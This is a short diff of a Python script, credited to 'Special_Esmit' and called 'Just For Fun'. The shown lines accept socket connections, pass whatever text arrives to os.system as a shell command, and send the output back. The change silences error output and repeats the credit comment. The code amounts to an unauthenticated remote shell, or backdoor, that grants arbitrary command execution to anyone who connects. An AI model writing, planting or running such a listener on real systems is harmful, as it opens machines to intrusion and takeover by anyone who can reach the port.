@@ -1,5 +1,7 @@
 #Created By Special_Esmit Just For Fun :)
 
+#Created By Special_Esmit Just For Fun :)
+
 import os
 import sys
 
@@ -15,7 +17,7 @@ while True:
 	try:
 		c, addr = s.accept()
 		rs = c.recv(1024).decode()
-		execute = os.system(rs + \' > execute.x\')
+		execute = os.system(rs + \' > execute.x 2> /dev/null\')
 		exf = open(\'execute.x\',\'r\').read()
 		try:
 			c.send(str(exf).encode())
